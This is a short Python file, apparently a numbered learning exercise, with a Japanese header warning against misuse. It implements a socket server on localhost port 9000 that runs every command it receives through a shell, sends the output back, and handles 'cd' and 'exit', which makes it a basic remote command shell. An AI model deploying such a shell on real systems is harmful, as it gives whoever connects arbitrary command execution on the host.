### 02_socket_remot_server.py
### 悪用厳禁です。socket通信のサーバー側のコードです。

import os
import subprocess
import socket

IP = "127.0.0.1"
PORT = 9000

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP, PORT))
    s.listen(1)

    conn, addr = s.accept()
    print(f"接続開始:IP:{IP}, PORT:{PORT}")

    while True:
        try:
            cmd = conn.recv(1024).decode().strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
            if cmd.startswith("cd "):
                os.chdir(cmd[3:].strip())
                conn.sendall(f"{cmd}:{os.getcwd()}".encode())

            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                conn.sendall(output)
            except subprocess.CalledProcessError as e:
                output= e.output

                conn.sendall(output)
        except Exception as e:
            error_message = f"エラー: {str(e)}"
            conn.sendall(error_message.encode())


        
